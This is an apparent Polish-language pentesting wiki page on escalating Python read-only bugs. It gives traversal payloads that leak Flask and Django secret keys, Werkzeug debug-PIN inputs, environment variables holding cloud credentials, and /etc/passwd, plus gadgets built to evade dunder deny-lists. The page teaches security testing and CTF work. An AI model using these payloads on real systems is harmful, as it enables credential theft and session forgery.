# Python Internal Read Gadgets

## Podstawowe informacje

Różne podatności, takie jak [**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) lub [**Class Pollution**](class-pollution-pythons-prototype-pollution.md), mogą umożliwić **odczyt wewnętrznych danych Pythona, ale nie pozwolą na wykonanie kodu**. Dlatego pentester będzie musiał maksymalnie wykorzystać te uprawnienia odczytu, aby **uzyskać wrażliwe uprawnienia i eskalować podatność**.

### Flask - Odczyt secret key

Strona główna aplikacji Flask prawdopodobnie będzie zawierać globalny obiekt **`app`**, w którym skonfigurowano ten **secret**.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
W tym przypadku można uzyskać dostęp do tego obiektu, używając dowolnego gadgetu do **uzyskania dostępu do obiektów globalnych** ze strony [**Bypass Python sandboxes**](bypass-python-sandboxes/index.html).

Jeśli **podatność znajduje się w innym pliku Python**, potrzebny jest gadget do przechodzenia między plikami, aby dotrzeć do głównego pliku, **uzyskać dostęp do globalnego obiektu `app.secret_key`** i móc [**eskalować uprawnienia**, znając ten klucz](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).

Payload taki jak ten [z tego writeupu](https://ctftime.org/writeup/36082):<sup>[[3]](#references)</sup>
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
Użyj tego payloadu, aby **odczytać `app.secret_key`**. Jeśli pierwotny bug zapewnia również write primitive (na przykład class pollution), ta sama ścieżka może posłużyć do zastąpienia go i podpisywania bardziej uprzywilejowanych ciasteczek Flask.

### Werkzeug - machine_id i node uuid

[**Korzystając z tych payloadów z tego writeupu**](https://vozec.fr/writeups/tweedle-dum-dee/) uzyskasz dostęp do **machine_id** i **uuid** node, czyli **prywatnych bitów** potrzebnych do [**wygenerowania Werkzeug pin**](../../network-services-pentesting/pentesting-web/werkzeug.md) i uzyskania dostępu do konsoli Pythona pod `/console`, jeśli **tryb debugowania jest włączony**:<sup>[[4]](#references)</sup>
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> Pamiętaj, że możesz uzyskać **lokalną ścieżkę serwera do `app.py`**, generując pewien **błąd** na stronie, który **poda Ci tę ścieżkę**.

Jeśli podatność znajduje się w innym pliku Python, sprawdź poprzedni trik Flask, aby uzyskać dostęp do obiektów z głównego pliku Python.

### Django - SECRET_KEY i moduł settings

Obiekt ustawień Django jest buforowany w `sys.modules` po uruchomieniu aplikacji. Korzystając wyłącznie z prymitywów odczytu, możesz uzyskać w wyniku leak **`SECRET_KEY`**, klucze zapasowe, dane uwierzytelniające do bazy danych lub sole podpisywania:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
Jeśli podatny gadget znajduje się w innym module, najpierw przejdź po globals:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS` są równie wartościowe jak bieżący `SECRET_KEY`: nadal weryfikują stare podpisane wartości podczas rotacji.<sup>[[1]](#references)</sup> Ujawnij również `SESSION_ENGINE` i `SESSION_SERIALIZER`, aby szybko ustalić, czy wpływ ogranicza się tylko do fałszowania cookie, czy może prowadzić do czegoś poważniejszego. Szczegółowe informacje dotyczące wpływu na web znajdziesz na stronie [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md).

### Module loader gadgets - odczyt kodu źródłowego i plików

Załadowane moduły Python zwykle zachowują `__loader__`. Loadery oparte na plikach często udostępniają `get_source()` i `get_data()`, które są idealnymi **prymitywami tylko do odczytu**, gdy możesz już uzyskać dostęp do obiektu modułu, ale nie do `open()`:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
Jest to bardzo przydatne do zrzucania **config modules, blueprints, helper files lub hidden routes** oraz odzyskiwania kluczy API, DSN, ścieżek flag lub dodatkowych punktów wejścia gadgetów.

Jeśli masz tylko enumerację podklas, wyszukaj loader po nazwie zamiast hardkodować indeks:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Globals z ramki generatora / coroutine

Jeśli możesz utworzyć obiekt generatora/coroutine lub uzyskać do niego dostęp, jego ramka może ujawnić globals **bez potrzeby korzystania z żadnego gadgetu `__globals__` funkcji**. Jest to przydatne przeciwko filtrom, które blokują tylko nazwy dunder i pomijają atrybuty ramek, takie jak `gi_frame`, `ag_frame`, `cr_frame` lub `f_globals`:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
Po uzyskaniu globalnych zmiennych ramki kontynuuj dokładnie tak jak w przypadku innych gadgets (`sys.modules`, obiekty settings, `os.environ` itd.). Recent sandbox escapes wciąż odkrywają to na nowo, ponieważ `gi_frame` i `f_globals` nie są atrybutami dunder i często przetrwają naiwne deny-listy.

### Zmienne środowiskowe / cloud creds przez załadowane moduły

Wiele jaili nadal importuje gdzieś `os` lub `sys`. Możesz wykorzystać dowolną osiągalną funkcję `__init__.__globals__`, aby przejść do już zaimportowanego modułu `os` i zrzucić **zmienne środowiskowe** zawierające API tokens, cloud keys lub flags:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
Jeśli indeks podklasy jest filtrowany, użyj loaderów:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
Zmienne środowiskowe są często jedynymi sekretami potrzebnymi do przejścia od odczytu do pełnego przejęcia (klucze cloud IAM, URL-e baz danych, klucze podpisywania itd.).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), wersje `<0.61.0`) umożliwiał **class pollution** za pomocą spreparowanych żądań komponentów. Ścieżka właściwości taka jak `__init__.__globals__` mogła prowadzić do globals modułu komponentu i zaimportowanych modułów; advisory pokazuje nadpisywanie `SECRET_KEY` Django oraz wartości w `os.environ`, a nie exploit tylko do odczytu.<sup>[[5]](#references)</sup> Jeśli osobny bug zapewnia dostęp do odczytu tego samego grafu obiektów, te globals mogą ujawniać konfigurację i dane uwierzytelniające bez konieczności wykonywania kodu.

### Kolekcje Gadgetów do chainingu

Nowsze CTF-y i badania nad pyjail pokazują niezawodne read chainy budowane wyłącznie za pomocą dostępu do atrybutów i enumeracji klas bazowych. Utrzymywane przez społeczność listy, takie jak [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker), katalogują setki minimalnych gadgetów, które można łączyć w celu przejścia od obiektów do `__globals__`, `sys.modules`, a następnie do wrażliwych danych.<sup>[[2]](#references)</sup> Preferuj wyszukiwanie **oparte na atrybutach/nazwach** zamiast surowych indeksów klas bazowych, ponieważ pozycja `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` itd. zmienia się między wersjami Pythona oraz wraz z dodatkowymi zaimportowanymi bibliotekami.

## References

- [1] [Dokumentacja podpisywania kryptograficznego Django](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [2] [pyjailbreaker – wiki gadgetów sandboxa Pythona](https://github.com/jailctf/pyjailbreaker)
- [3] [CTFtime.org / idekCTF 2022 / task manager / writeup](https://ctftime.org/writeup/36082)
- [4] [Tweedle Dum & Dee – writeup FCSC 2023](https://vozec.fr/writeups/tweedle-dum-dee/)
- [5] [Podatność Django-Unicorn Class Pollution prowadząca do RCE, XSS, DoS i obejścia uwierzytelniania (GHSA-g9wf-5777-gq43)](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43)
{{#include ../../banners/hacktricks-training.md}}
